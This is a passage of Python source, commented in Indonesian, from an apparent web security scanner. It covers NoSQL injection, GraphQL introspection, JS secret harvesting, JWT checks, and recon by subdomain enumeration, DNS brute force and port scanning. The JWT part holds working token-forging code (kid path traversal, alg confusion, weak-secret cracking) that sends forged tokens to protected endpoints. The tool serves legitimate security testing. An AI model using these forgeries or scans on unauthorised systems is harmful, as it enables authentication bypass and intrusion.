            for sev, code, desc, url, msg in out:
                critical(msg)
                f.append((sev, code, desc, url))
            f.extend(scan_oob_xxe(sess, base_url, ctx))
            return f
    # Blind XXE (entity eksternal tanpa output) hanya terbukti lewat callback OOB.
    f.extend(scan_oob_xxe(sess, base_url, ctx))
    return f

def scan_nosqli(sess, base_url, ctx=None):
    f = FindingList(); info("Menguji NoSQL injection...")
    if echo_skip(sess, base_url, ctx):
        info("  (dilewati: endpoint memantulkan input)")
        return f
    def _check(param):
        try:
            r1 = sess.get(base_url, params={param: '{"$gt":""}'}, timeout=10)
            r2 = sess.get(base_url, params={param: "test"}, timeout=10)
            if r1.status_code==200 and abs(len(r1.content)-len(r2.content)) > 500:
                return [("MEDIUM","NOSQLI",f"Parameter '{param}' menunjukkan respons berbeda saat dikirim nilai JSON operator MongoDB ($gt). Attacker bisa bypass autentikasi atau membaca data tanpa izin.", None, f"Kemungkinan NoSQL injection di parameter '{param}'")]
        except: pass
        return []
    out = pmap_until(_check, ["id","user","username","email","token"])
    if out:
        for sev, code, desc, url, msg in out:
            warn(msg)
            f.append((sev, code, desc) if url is None else (sev, code, desc, url))
    return f

def scan_graphql(sess, base_url, ctx=None):
    f = FindingList(); info("Memeriksa GraphQL...")
    # Introspection query mentah (tanpa double-encode)
    q_raw = "{__schema{types{name fields{name}}}}"
    paths = ["/graphql","/api/graphql","/gql","/graphiql","/v1/graphql","/query"]
    # GET dan POST tiap path dicek paralel; tiap job mencoba dua metode sekaligus.
    def _check(url):
        # GET — param query lgsg
        try:
            r = sess.get(url, params={"query": q_raw}, timeout=10)
            if r.status_code in (200,201):
                try:
                    j = r.json()
                    if isinstance(j.get("data"), dict) and "__schema" in j["data"]:
                        return [("HIGH","GRAPHQL_INTROSPECTION",f"GraphQL endpoint di {url} mengizinkan introspection query via GET. Siapa pun bisa mendapatkan skema lengkap API — termasuk semua tipe, query, mutasi, dan field. Ini membocorkan seluruh permukaan API.", url, f"GraphQL introspection aktif (GET): {url}")]
                except: pass
        except: pass
        # POST — kirim JSON langsung (jangan pake json.dumps lagi biar requests yg encode)
        try:
            r = sess.post(url, json={"query": q_raw}, timeout=10)
            if r.status_code in (200,201):
                try:
                    j = r.json()
                    if isinstance(j.get("data"), dict) and "__schema" in j["data"]:
                        return [("HIGH","GRAPHQL_INTROSPECTION",f"GraphQL endpoint di {url} mengizinkan introspection query via POST. Siapa pun bisa mendapatkan skema lengkap API — termasuk semua tipe, query, mutasi, dan field. Ini membocorkan seluruh permukaan API.", url, f"GraphQL introspection aktif (POST): {url}")]
                except: pass
        except: pass
        return []
    out = pmap_until(_check, [join(base_url, p) for p in paths])
    if out:
        for sev, code, desc, url, msg in out:
            critical(msg)
            f.append((sev, code, desc, url))
        return f
    return f

def scan_js(sess, base_url, ctx=None):
    f = FindingList(base_url); info("Menganalisis JavaScript...")
    try:
        r = get_base_response(sess, base_url, ctx)
        if r is None:
            info("Tidak bisa mengambil halaman utama"); return f
        js_urls = set()
        js_pattern = re.compile(r'<script[^>]*src=["\']([^"\']+\.js[^"\']*)["\']', re.I)
        for m in js_pattern.finditer(r.text):
            js_urls.add(urllib.parse.urljoin(base_url, m.group(1)))
        crawler = ctx.get("crawler") if ctx else None
        if crawler and crawler.pages:
            for page_url, page_html in list(crawler.pages.items())[:RECON_JS_MAX_PAGES]:
                for m in js_pattern.finditer(page_html or ""):
                    js_urls.add(urllib.parse.urljoin(page_url, m.group(1)))
        if not js_urls: info("Tidak ada file JS"); return f
        targets = sorted(js_urls)[:RECON_JS_MAX_FILES]
        info(f"Ditemukan {len(js_urls)} file JS")
        # Berkas hasil panen recon dipakai ulang supaya tidak diunduh dua kali.
        harvested = (ctx or {}).get("js_texts") or {}
        def _fetch(js_url):
            if js_url in harvested:
                return js_url, harvested[js_url]
            try:
                r2 = sess.get(js_url, timeout=10)
                if r2.status_code==200:
                    return js_url, r2.text
            except: pass
            return js_url, None
        for js_url, t in pmap(_fetch, targets):
            if t is not None:
                fn = js_url.split('/')[-1]
                # API endpoints
                apis = re.findall(r'["\'](/[a-zA-Z0-9_\-./?&=]+)["\']', t)
                apis = [x for x in set(apis) if re.search(r'/api/|/v1/|/v2/|graphql|rest', x, re.I)]
                apis = [x for x in apis if not any(s in x.lower() for s in ["jquery","react","vue","angular","bootstrap","fontawesome"])]
                if apis:
                    info(f"  {fn}: {len(apis)} endpoint API")
                    f.append(("INFO","JS_APIS",f"File {fn} mengandung {len(apis)} endpoint API. Endpoint ini mungkin tidak terdokumentasi: {', '.join(apis[:5])}"), evidence_url=js_url)
                # Ekstraksi diperluas: literal path/URL di fetch/axios/url/map rute.
                endpoints = extract_js_endpoints(t, (urllib.parse.urlparse(base_url).hostname or "").lower())
                if endpoints:
                    info(f"  {fn}: {len(endpoints)} endpoint/path")
                    f.append(("INFO","JS_ENDPOINT",f"File {fn} memuat {len(endpoints)} endpoint/path, mis. {', '.join(endpoints[:5])}. Endpoint dari bundel JS sering tidak terdokumentasi dan bisa dipakai tanpa autentikasi.", js_url, f"Endpoint JS: {len(endpoints)}"), evidence_url=js_url)
                # Hardcoded secrets
                secrets = re.findall(r'(?:api[_-]?key|secret|password|token|auth)\s*[:=]\s*["\'](?!([A-Z][a-z]+\s))([a-zA-Z0-9_\-/@#$%^&*+=]{16,})["\']', t, re.I)
                secrets = [s for s,_ in secrets]
                real = []
                for s in secrets:
                    sl = s.lower()
                    if any(kw in sl for kw in ["unexpected","duplicate","undefined","prototype","function","callback","return","default","configure","property","attribute"]): continue
                    if re.search(r'[0-9]', s) or re.search(r'[A-Z]', s): real.append(s)
                for s in real[:5]:
                    critical(f"Kredensial hardcode di {fn}")
                    f.append(("CRITICAL","JS_SECRET",f"File JS {fn} mengandung kredensial/secret hardcode: '{s[:20]}...'. Jika ini adalah kredensial produksi, attacker bisa langsung mengakses resource yang dilindungi."), evidence_url=js_url)
    except: pass
    return f

# ── JWT: helper offline (stdlib saja, tanpa dependency eksternal) ──

def b64url_encode(raw):
    """Encode bytes jadi segmen base64url tanpa padding (format JWT)."""
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")

def b64url_decode(segment):
    """Decode segmen base64url tanpa padding. None kalau tidak valid."""
    if not isinstance(segment, str) or not segment:
        return None
    try:
        return base64.urlsafe_b64decode(segment + "=" * (-len(segment) % 4))
    except Exception:
        return None

def jwt_parts(token):
    """(header, payload, signature, token) dari sebuah JWT, atau None kalau bukan JWT."""
    if not isinstance(token, str) or token.count(".") != 2:
        return None
    head, body, signature = token.split(".")
    if not head or not body:
        return None
    header = b64url_decode(head); body_raw = b64url_decode(body)
    if header is None or body_raw is None:
        return None
    try:
        header = json.loads(header.decode("utf-8", "replace"))
        payload = json.loads(body_raw.decode("utf-8", "replace"))
    except Exception:
        return None
    if not isinstance(header, dict):
        return None
    return header, (payload if isinstance(payload, dict) else {}), signature, token

def jwt_sign(header, payload, key, sign_alg="HS256"):
    """Bikin JWT: header/payload apa adanya, tanda tangan HMAC dari `key`.

    `sign_alg` memisahkan algoritma HMAC yang benar-benar dipakai dari klaim
    `alg` di header — inti uji alg confusion (klaim RS256 + tanda tangan HMAC).
    """
    digest = JWT_HMAC_ALGS.get(sign_alg)
    if digest is None:
        return None
    head = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    body = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    raw_key = key if isinstance(key, bytes) else str(key).encode()
    mac = hmac.new(raw_key, f"{head}.{body}".encode(), digest).digest()
    return f"{head}.{body}.{b64url_encode(mac)}"

def jwt_crack_hmac(token, secrets):
    """Cari secret HMAC token dari daftar kandidat (offline, tanpa request)."""
    parsed = jwt_parts(token)
    if parsed is None:
        return None
    header, _payload, signature, _raw = parsed
    digest = JWT_HMAC_ALGS.get(str(header.get("alg") or ""))
    if digest is None or not signature:
        return None
    expected = b64url_decode(signature)
    if expected is None:
        return None
    signing_input = token.rsplit(".", 1)[0].encode()
    for secret in secrets:
        raw = secret if isinstance(secret, bytes) else str(secret).encode()
        if hmac.compare_digest(hmac.new(raw, signing_input, digest).digest(), expected):
            return secret
    return None

def jwt_secret_candidates(ctx):
    """Kandidat secret untuk crack HMAC: punya tester (--jwt-secrets) lalu bawaan."""
    out, seen = [], set()
    for secret in list((ctx or {}).get("jwt_secrets") or ()) + list(DEFAULT_JWT_SECRETS):
        if secret and secret not in seen:
            seen.add(secret)
            out.append(secret)
    return out

def _auth_sources(sess, resp=None):
    """Sumber header yang mewakili request scan: session default + request nyata."""
    return [src for src in (sess, getattr(resp, "request", None)) if src is not None]

def auth_header_candidates(sess, resp=None):
    """Nilai mentah header `Authorization` yang terlihat scan (dengan skema).

    Dipakai untuk mengenali token JWT yang dikirim tester (`--bearer` atau
    `-H "Authorization: ..."`) maupun yang datang dari respons.
    """
    out = OrderedDict()
    for source in _auth_sources(sess, resp):
        try:
            headers = dict(source.headers)
        except Exception:
            continue
        for name, value in headers.items():
            if isinstance(value, str) and name.lower() == "authorization":
                out[name] = value
    return out

def cookie_candidates(sess, resp=None):
    """Pasangan (nama, nilai) cookie yang benar-benar dipakai scan.

    Dua sumber digabung: header `Cookie` sesi dan cookie jar. Header dibaca
    lebih dulu karena `--cookie`/`-H "Cookie: ..."` disuntikkan sebagai header
    mentah ke session, bukan ke cookie jar curl_cffi; cookie jar (hasil
    `Set-Cookie`) hanya mengisi nama yang belum ada.
    """
    jar = OrderedDict()
    for source in _auth_sources(sess, resp):
        try:
            headers = dict(source.headers)
        except Exception:
            continue
        for name, value in headers.items():
            if not isinstance(value, str) or name.lower() != "cookie":
                continue
            for chunk in value.split(";"):
                cname, sep, cval = chunk.strip().partition("=")
                if sep and cname.strip():
                    jar[cname.strip()] = cval.strip()
    try:
        for name, value in sess.cookies.items():
            jar.setdefault(name, value)
    except Exception:
        pass
    return jar

def jwt_tokens(sess, resp=None):
    """Kandidat token JWT dari cookie yang dipakai scan + header Authorization."""
    found, seen = [], set()

    def _add(where, name, value):
        if not isinstance(value, str) or value.count(".") != 2 or (name, value) in seen:
            return
        seen.add((name, value))
        found.append((where, name, value))

    for cname, cvalue in cookie_candidates(sess, resp).items():
        _add("cookie", cname, cvalue)
    for _name, raw in auth_header_candidates(sess, resp).items():
        token = raw[7:].strip() if raw.startswith("Bearer ") else raw.strip()
        _add("header", "Authorization", token)
    return found

def jwt_kid_suspect(kid):
    """True kalau klaim `kid` menunjuk ke luar direktori kunci (path/URL/absolut)."""
    if not isinstance(kid, str) or not kid:
        return False
    low = kid.lower()
    return (".." in kid or "\\" in kid or low.startswith(("http://", "https://", "file:", "/"))
            or low.endswith((".pem", ".key", ".json")))

def jwt_expired(payload):
    """True kalau klaim `exp` sudah lewat."""
    exp = (payload or {}).get("exp")
    return isinstance(exp, (int, float)) and exp < time.time()

def jwt_protected_targets(sess, base_url, ctx):
    """Endpoint terlindungi yang layak jadi orakel token: 200 sesi vs 401/403 anonim."""
    if (ctx or {}).get("anon_sess") is None:
        return []
    crawler = (ctx or {}).get("crawler")
    paths = list(JWT_PROTECTED_PATHS)
    if crawler and crawler.pages:
        paths.extend(list(crawler.pages)[:JWT_CRAWL_TARGETS])
    out = []
    for path in dict.fromkeys(paths):
        url = join(base_url, path)
        try:
            authed = sess.get(url, timeout=10)
            denied = (ctx or {})["anon_sess"].get(url, timeout=10)
        except Exception:
            continue
        if authed.status_code == 200 and denied.status_code in (401, 403):
            out.append((url, _resp_fingerprint(authed)))
    return out

def jwt_accepted(sess, url, token, fingerprint):
    """True kalau server menerima token yang dikirim penyerang di URL terlindungi."""
    try:
        resp = sess.get(url, headers={"Authorization": f"Bearer {token}"}, timeout=10)
    except Exception:
        return False
    return resp.status_code == 200 and _resp_fingerprint(resp) == fingerprint

def jwt_public_key(sess, base_url):
    """Public key server (PEM/JWKS) untuk uji alg confusion; None kalau tidak ada."""
    for path in JWT_KEY_PATHS:
        url = join(base_url, path)
        try:
            resp = sess.get(url, timeout=10)
        except Exception:
            continue
        if resp.status_code != 200:
            continue
        text = resp.text or ""
        if "BEGIN PUBLIC KEY" in text or "BEGIN CERTIFICATE" in text:
            return url, text
        try:
            payload = resp.json()
        except Exception:
            continue
        keys = payload.get("keys") if isinstance(payload, dict) else None
        if any(isinstance(key, dict) and "kty" in key for key in (keys or [])):
            return url, text
    return None

def scan_jwt(sess, base_url, ctx=None):
    f = FindingList(base_url); info("Menganalisis JWT...")
    try:
        r = get_base_response(sess, base_url, ctx)
    except: pass
    if r is not None:
        for ck, cv in cookie_candidates(sess, r).items():
            parts = jwt_parts(cv)
            if parts is None:
                continue
            alg = parts[0].get("alg")
            if alg == "none":
                critical(f"JWT di cookie '{ck}' menggunakan alg=none")
                f.append(("CRITICAL","JWT_ALG_NONE",f"JWT di cookie '{ck}' menggunakan algoritma 'none'. Attacker bisa memalsukan token dengan payload apa pun tanpa tanda tangan dan mendapatkan akses tidak sah."))
            else:
                info(f"JWT di cookie '{ck}', alg={alg}")
                f.append(("INFO","JWT_COOKIE",f"Cookie '{ck}' berisi JWT (alg={alg}). Token perlu dievaluasi manual untuk validasi signature, expiry, dan klaim."))
        bearer = any(v.startswith("Bearer ") and v[7:].strip().count(".")==2
                     for v in auth_header_candidates(sess, r).values())
        if bearer:
            f.append(("INFO","JWT_BEARER","Authorization header menggunakan Bearer token JWT. Periksa validitas token secara manual."))

    # ── Uji offline: klaim 'kid' mencurigakan + crack secret HMAC lemah ──
    tokens = jwt_tokens(sess, r)
    candidates = jwt_secret_candidates(ctx)
    weak = None
    for _where, name, token in tokens:
        parts = jwt_parts(token)
        if parts is None:
            continue
        kid = parts[0].get("kid")
        if jwt_kid_suspect(kid):
            warn(f"Klaim 'kid' mencurigakan di token {name}: {kid}")
            f.append(("INFO","JWT_KID_SUSPECT",
                      f"Token {name} membawa klaim 'kid' bernilai '{kid}' — bentuknya path/URL, bukan nama kunci biasa. "
                      f"Kalau server memakai nilai ini untuk memuat file kunci, penyerang bisa mengarahkannya ke file "
                      f"yang dikendalikan (path traversal / key injection).",
                      base_url, None), evidence_url=base_url)
        if weak is None:
            secret = jwt_crack_hmac(token, candidates)
            if secret is not None:
                weak = (name, secret)
                critical(f"Secret JWT lemah tertebak: {name}")
                f.append(("CRITICAL","JWT_WEAK_SECRET",
                          f"Token {name} ditandatangani HMAC dengan secret lemah ({secret!r}) yang ada di daftar kata "
                          f"umum. Siapa pun bisa membuat token dengan klaim apa pun — termasuk mengaku admin — tanpa "
                          f"kredensial sekalipun.",
                          base_url, f"Secret JWT lemah: {secret!r}"), evidence_url=base_url)

    # ── Uji penerimaan token palsu: kid traversal, alg confusion, klaim exp ──
    if not _ctx_flag(ctx, "auth_enabled") or (ctx or {}).get("anon_sess") is None:
        if tokens:
            info("  (uji kid/alg-confusion/exp dilewati: butuh sesi autentikasi — pakai --cookie/-H/--bearer)")
        return f
    targets = jwt_protected_targets(sess, base_url, ctx)
    if not targets:
        info("  Tidak ada endpoint terlindungi (200 sesi vs 401/403 anonim) — uji token palsu dilewati")
        return f
    info(f"  {len(targets)} endpoint terlindungi diuji ulang dengan token palsu")

    claims = {"sub": "spade", "iat": int(time.time())}
    forgeries = [("JWT_KID_TRAVERSAL",
                  jwt_sign({"alg": "HS256", "typ": "JWT", "kid": "../../../../dev/null"}, claims, b""))]
    public = jwt_public_key(sess, base_url)
    if public is None:
        info("  Public key/JWKS tidak ditemukan — uji alg confusion dilewati")
    else:
        key_url, key_text = public
        info(f"  Public key ditemukan di {key_url} — uji alg confusion")
        f.append(("INFO","JWT_ALG_CONFUSION_SURFACE",
                  f"Public key server bisa diambil publik di {key_url}. Kalau verifier memilih algoritma dari klaim "
                  f"'alg' di token, kunci ini bisa dipakai untuk menandatangani token HS256 (alg confusion).",
                  key_url, None), evidence_url=key_url)
        # PoC klasik: header mengaku RS256, tapi tanda tangannya HMAC memakai public key.
        forgeries.append(("JWT_ALG_CONFUSION",
                          jwt_sign({"alg": "RS256", "typ": "JWT"}, claims, key_text, sign_alg="HS256")))

    forgery_text = {
        "JWT_KID_TRAVERSAL": ("Klaim 'kid' dipakai server untuk memuat file kunci, jadi penyerang bisa "
                              "mengarahkannya ke file kosong (path traversal) lalu menandatangani token dengan kunci "
                              "kosong. Token buatan penyerang diterima sebagai pengguna sah."),
        "JWT_ALG_CONFUSION": ("Verifier memilih algoritma dari klaim 'alg' di token, sehingga token yang "
                              "ditandatangani memakai public key server (HMAC) diterima sebagai token sah. "
                              "Penyerang bisa mengaku sebagai pengguna mana pun tanpa memiliki kunci privat."),
    }
    for code, token in forgeries:
        if token is None:
            continue
        for url, fingerprint in targets:
            if not jwt_accepted(sess, url, token, fingerprint):
                continue
            critical(f"{code} terkonfirmasi di {url}")
            f.append(("HIGH", code,
                      f"Token palsu buatan penyerang diterima server di {url} (HTTP 200 tanpa kredensial valid). "
                      f"{forgery_text[code]}",
                      url, f"{code} terkonfirmasi di {url}", "firm"), evidence_url=url)

    for _where, name, token in tokens:
        parts = jwt_parts(token)
        if parts is None:
            continue
        payload = parts[1]
        for url, fingerprint in targets:
            if not jwt_accepted(sess, url, token, fingerprint):
                continue
            if jwt_expired(payload):
                warn(f"Token kedaluwarsa masih diterima di {url}")
                f.append(("HIGH","JWT_EXPIRED_ACCEPTED",
                          f"Token {name} dari sesi tester sudah lewat masa berlaku (`exp` = {payload.get('exp')}) tapi "
                          f"tetap diterima di {url}. Server tidak memeriksa klaim `exp`, jadi token yang bocor atau "
                          f"tercuri tetap berlaku selamanya.",
                          url, f"Token kedaluwarsa masih diterima di {url}", "firm"), evidence_url=url)
            elif "exp" not in payload:
                info(f"Token {name} diterima di {url} tanpa klaim exp")
                f.append(("LOW","JWT_NO_EXPIRY",
                          f"Token {name} diterima di {url} tapi tidak membawa klaim `exp`, jadi token ini tidak punya "
                          f"masa berlaku. Sekali bocor atau tercuri, token itu bisa dipakai selamanya.",
                          url, f"Token tanpa klaim exp diterima di {url}", "tentative"), evidence_url=url)
    return f

# ══════════════════════════════════════════════════════════════════
# RECON (bagian 3) — enumerasi subdomain, URL historis, endpoint JS, port scan
#
# Semua sumber pasif diakses lewat API HTTP publik memakai session yang sama
# (curl_cffi), jadi tidak butuh binary eksternal. Hasil recon dipakai dua kali:
#   * seed crawler (URL historis), dan
#   * pool parameter untuk modul injection (SQLi/XSS/LFI/open redirect).
# Batas request/berkas ada di konstanta RECON_* / PORT_SCAN_*.
# ══════════════════════════════════════════════════════════════════

# Ekstensi aset statis yang tidak pernah dipakai sebagai seed crawl/endpoint.
STATIC_ASSET_EXT = (".pdf", ".zip", ".png", ".jpg", ".jpeg", ".gif", ".css",
                    ".js", ".svg", ".ico", ".woff", ".woff2", ".ttf", ".eot",
                    ".map", ".mp4", ".webp", ".gz", ".tar", ".rar")

def _recon_is_static(url):
    return (urllib.parse.urlparse(str(url)).path or "").lower().endswith(STATIC_ASSET_EXT)

def _recon_timeout_status(exc):
    """Bedakan timeout dari error lain supaya status sumber di laporan akurat."""
    text = str(exc).lower()
    if "timed out" in text or "timeout" in text:
        return "timeout"
    return "error"

def _recon_target_host(base_url):
    """Nama host yang boleh dienumerasi; "" untuk IP/localhost (scan offline)."""
    host = (urllib.parse.urlparse(base_url).hostname or "").lower()
    host = re.sub(r"^www\.", "", host)
    if not host or host == "localhost" or ":" in host:
        return ""
    if re.fullmatch(r"[0-9.]+", host):        # IPv4: bukan domain publik
        return ""
    if not re.fullmatch(r"[a-z0-9]([a-z0-9\-]*[a-z0-9])?(\.[a-z0-9]([a-z0-9\-]*[a-z0-9])?)+", host):
        return ""
    if not re.search(r"\.[a-z]{2,}$", host):
        return ""
    return host

def _recon_clean_names(values, host, limit=RECON_MAX_SUBDOMAINS):
    """Normalisasi nama dari sumber sertifikat: lowercase, tanpa wildcard, unik."""
    out = []
    for raw in values or ():
        name = str(raw or "").strip().lower().rstrip(".")
        if name.startswith("*."):
            name = name[2:]
        if not name or name == host:
            continue
        if not name.endswith("." + host):
            continue
        if not re.fullmatch(r"[a-z0-9]([a-z0-9\-.]*[a-z0-9])?", name):
            continue
        if name not in out:
            out.append(name)
        if len(out) >= limit:
            break
    return out

def _recon_fetch_json(sess, url, timeout):
    """GET + parse JSON. Mengembalikan (data, status)."""
    try:
        r = sess.get(url, timeout=timeout)
    except Exception as exc:
        return None, _recon_timeout_status(exc)
    if getattr(r, "status_code", None) != 200:
        return None, "error"
    try:
        return r.json(), "ok"
    except Exception:
        return None, "error"

def _recon_source_crtsh(sess, base_url, host):
    """Subdomain dari log transparansi sertifikat crt.sh."""
    url = f"https://crt.sh/?q=%25.{host}&output=json"
    data, status = _recon_fetch_json(sess, url, RECON_SOURCE_TIMEOUT)
    if not isinstance(data, list):
        return [], status, url
    names = []
    for entry in data:
        if isinstance(entry, dict):
            names.extend(str(entry.get("name_value", "")).split("\n"))
    return _recon_clean_names(names, host), ("ok" if names else "empty"), url

def _recon_source_certspotter(sess, base_url, host):
    """Subdomain dari Cert Spotter (cadangan saat crt.sh kosong/lambat)."""
    url = ("https://api.certspotter.com/v1/issuances?domain=" + host
           + "&include_subdomains=true&expand=dns_names")
    data, status = _recon_fetch_json(sess, url, RECON_SOURCE_TIMEOUT)
    if not isinstance(data, list):
        return [], status, url
    names = []
    for entry in data:
        if isinstance(entry, dict):
            names.extend(entry.get("dns_names") or [])
    return _recon_clean_names(names, host), ("ok" if names else "empty"), url

def _recon_source_wayback(sess, base_url, host):
    """URL historis dari Wayback CDX (responsnya bisa lambat: timeout 45s)."""
    url = ("https://web.archive.org/cdx/search/cdx?url=" + host
           + "&matchType=domain&output=json&collapse=urlkey&fl=original&limit=1000")
    data, status = _recon_fetch_json(sess, url, RECON_CDX_TIMEOUT)
    if not isinstance(data, list):
        return [], status, url
    urls = []
    for row in data[1:]:                       # baris pertama = header kolom
        if isinstance(row, list) and row:
            urls.append(str(row[0]))
        elif isinstance(row, str):
            urls.append(row)
    return urls, ("ok" if urls else "empty"), url

def _recon_source_commoncrawl(sess, base_url, host):
    """URL historis dari indeks Common Crawl (koleksi terbaru)."""
    collinfo = "https://index.commoncrawl.org/collinfo.json"
    collections, status = _recon_fetch_json(sess, collinfo, RECON_SOURCE_TIMEOUT)
    if not isinstance(collections, list) or not collections:
        return [], status, collinfo
    index = ""
    for entry in collections:
        if isinstance(entry, dict) and entry.get("cdx-api"):
            index = str(entry["cdx-api"])
            break
    if not index:
        return [], "error", collinfo
    url = index + "?url=" + host + "&matchType=domain&output=json&limit=500"
    try:
        r = sess.get(url, timeout=RECON_CDX_TIMEOUT)
    except Exception as exc:
        return [], _recon_timeout_status(exc), url
    if getattr(r, "status_code", None) != 200:
        return [], "error", url
    urls = []
    for line in (getattr(r, "text", "") or "").splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            record = json.loads(line)
        except Exception:
            continue
        if isinstance(record, dict) and record.get("url"):
            urls.append(str(record["url"]))
    return urls, ("ok" if urls else "empty"), url

def recon_sources():
    """Registry sumber recon pasif.

    Test mengganti isi registry ini (monkeypatch) supaya seluruh alur recon bisa
    diuji offline tanpa menyentuh crt.sh/Wayback/Common Crawl.
    """
    return {
        "crtsh": _recon_source_crtsh,
        "certspotter": _recon_source_certspotter,
        "wayback": _recon_source_wayback,
        "commoncrawl": _recon_source_commoncrawl,
    }

def recon_dns_resolve(fqdn, timeout=RECON_DNS_TIMEOUT):
    """True kalau `fqdn` punya alamat IP. Seam yang dipatch di test.

    Lookup dijalankan di thread penjaga supaya resolver OS yang menggantung tidak
    memblokir scan lebih lama dari `timeout`.
    """
    found = []

    def _lookup():
        try:
            socket.getaddrinfo(fqdn, 443, socket.AF_UNSPEC, socket.SOCK_STREAM)
            found.append(True)
        except Exception:
            pass

    worker = threading.Thread(target=_lookup, daemon=True)
    worker.start()
    worker.join(timeout)
    return bool(found)

def recon_dns_brute(host, limit=RECON_MAX_SUBDOMAINS):
    """Brute force DNS ringan dengan wordlist internal (paralel)."""
    def _one(name):
        fqdn = f"{name}.{host}"
        return fqdn if recon_dns_resolve(fqdn) else None
    found = []
    for item in pmap(_one, RECON_DNS_WORDLIST):
        if item and item not in found:
            found.append(item)
        if len(found) >= limit:
            break
    return found

def recon_probe_host(sess, name):
    """Probe ringan host hasil enumerasi: status + title + header Server.

    Tidak ada modul kerentanan yang dijalankan di host ini — hanya bukti hidup.
    """
    for scheme in ("https", "http"):
        url = f"{scheme}://{name}/"
        try:
            r = sess.get(url, timeout=RECON_HOST_TIMEOUT)
        except Exception:
            continue
        text = getattr(r, "text", "") or ""
        title = ""
        m = re.search(r"<title[^>]*>(.*?)</title>", text, re.I | re.S)
        if m:
            title = " ".join(m.group(1).split())[:80]
        headers = getattr(r, "headers", None) or {}
        return {"url": url, "status": getattr(r, "status_code", None),
                "title": title, "server": str(headers.get("Server", ""))[:60]}
    return None

def recon_port_open(host, port, timeout=PORT_SCAN_TIMEOUT):
    """TCP connect scan sederhana. Seam yang dipatch di test."""
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except Exception:
        return False

def recon_port_scan(hosts):
    """Port scan ringan: host x PORT_SCAN_PORTS, hasil hanya port terbuka."""
    found = []
    for host in hosts:
        def _one(port):
            return port if recon_port_open(host, port) else None
        for port in pmap(_one, PORT_SCAN_PORTS):
            if port:
                found.append((host, port, PORT_SCAN_SERVICES.get(port, "unknown")))
    return found

def _recon_clean_urls(urls, host, limit=RECON_MAX_HISTORIC_URLS):
    """Buang URL di luar host target, non-http, dan aset statis; jaga urutan."""
    out = []
    for raw in urls or ():
        try:
            p = urllib.parse.urlparse(str(raw).strip())
        except Exception:
            continue
        if p.scheme not in ("http", "https") or not p.netloc:
            continue
        netloc_host = p.netloc.split(":")[0].lower()
        if netloc_host != host and not netloc_host.endswith("." + host):
            continue
        clean = f"{p.scheme}://{p.netloc}{p.path or '/'}"
        if p.query:
            clean += "?" + p.query
        if _recon_is_static(clean) or clean in out:
            continue
        out.append(clean)
        if len(out) >= limit:
            break
    return out

def recon_param_targets(urls, max_urls=RECON_PARAM_URLS, max_names=RECON_PARAM_NAMES):
    """[(url_tanpa_query, [nama parameter])] dari URL hasil recon.

    Hanya parameter yang benar-benar ada di URL historis yang dipakai — bukan
    wordlist — supaya modul injection tidak menembak parameter karangan.
    """
    out = []
    seen = set()
    for raw in urls or ():
        try:
            p = urllib.parse.urlparse(str(raw))
        except Exception:
            continue
        if not p.query:
            continue
        names = []
        for name, _value in urllib.parse.parse_qsl(p.query, keep_blank_values=True):
            if name and name not in names:
                names.append(name)
        names = names[:max_names]
        if not names:
            continue
        key = (p.scheme, p.netloc, p.path)
        if key in seen:
            continue
        seen.add(key)
        out.append((f"{p.scheme}://{p.netloc}{p.path}", names))
        if len(out) >= max_urls:
            break
    return out

def recon_injection_targets(ctx):
    """[(url, [param])] hasil recon untuk modul injection (selalu berbatas)."""
    targets = ctx.get("recon_param_targets") if isinstance(ctx, dict) else None
    out = []
    for job in targets or ():
        try:
            url, params = job
        except Exception:
            continue
        if not url or not params:
            continue
        out.append((url, list(params)[:RECON_PARAM_NAMES]))
        if len(out) >= RECON_PARAM_URLS:
            break
    return out

def injection_url_jobs(ctx, base_url):
    """Target injection: (base_url, None) + URL hasil recon yang punya query.

    `None` berarti "pakai daftar parameter bawaan modul" (perilaku lama, tidak
    berubah saat recon tidak jalan).
    """
    jobs = [(base_url, None)]
    for url, params in recon_injection_targets(ctx):
        if url and url != base_url:
            jobs.append((url, params))
    return jobs

def recon_seed_urls(ctx):
    """Seed crawler tambahan dari URL historis (berbatas RECON_MAX_SEEDS)."""
    urls = ctx.get("recon_urls") if isinstance(ctx, dict) else None
    return [u for u in (urls or []) if not _recon_is_static(u)][:RECON_MAX_SEEDS]

def _looks_like_endpoint(candidate):
    """Filter hasil ekstraksi JS: hanya rute API/menarik, bukan aset statis."""
    if not candidate.startswith("/") or len(candidate) > 200:
        return False
    if re.search(r"[\s{}#$<>\"'`]", candidate):
        return False
    path, _, query = candidate.partition("?")
    if path.lower().endswith(STATIC_ASSET_EXT):
        return False
    if query and "=" in query:
        return True
    return bool(re.search(r"(?:^|/)(?:api|apis|rest|graphql|gql|rpc|json|v\d+|oauth|auth|"
                          r"token|account|user|users|admin|search|upload|files?|order|payment|"
                          r"webhook|internal|private|config|debug|export|report)(?:/|$|\?|=)",
                          path, re.I))

def extract_js_endpoints(text, host=""):
    """Endpoint dari berkas JS: literal relatif dan absolut (host target saja)."""
    found = []
    pattern = re.compile(r"""["'`]([^"'`\s<>]{2,200})["'`]""")
    for m in pattern.finditer(text or ""):
        raw = m.group(1).strip()
        if not raw:
            continue
        if raw.startswith(("http://", "https://", "//")):
            p = urllib.parse.urlparse(raw if not raw.startswith("//") else "https:" + raw)
            if host and p.netloc.split(":")[0].lower() != host:
                continue
            candidate = p.path or "/"
            if p.query:
                candidate += "?" + p.query
        elif raw.startswith("/"):
            candidate = raw
        else:
            continue
        if _looks_like_endpoint(candidate) and candidate not in found:
            found.append(candidate)
        if len(found) >= RECON_JS_MAX_ENDPOINTS:
            break
    return found

def recon_js(sess, base_url, ctx=None):
    """Panen endpoint dari berkas JS (halaman utama + halaman crawl).

    Hasilnya dimemoikan di ctx["recon_js"] dan teks JS disimpan di ctx["js_texts"]
    supaya modul `js` tidak mengunduh berkas yang sama dua kali.
    """
    def _harvest():
        host = (urllib.parse.urlparse(base_url).hostname or "").lower()
        pages = []
        response = get_base_response(sess, base_url, ctx)
        if response is not None:
            pages.append((base_url, getattr(response, "text", "") or ""))
        crawler = ctx.get("crawler") if isinstance(ctx, dict) else None
        if crawler and crawler.pages:
            for page_url, page_html in list(crawler.pages.items()):
                if page_url == base_url:
                    continue
                pages.append((page_url, page_html))
                if len(pages) > RECON_JS_MAX_PAGES:
                    break
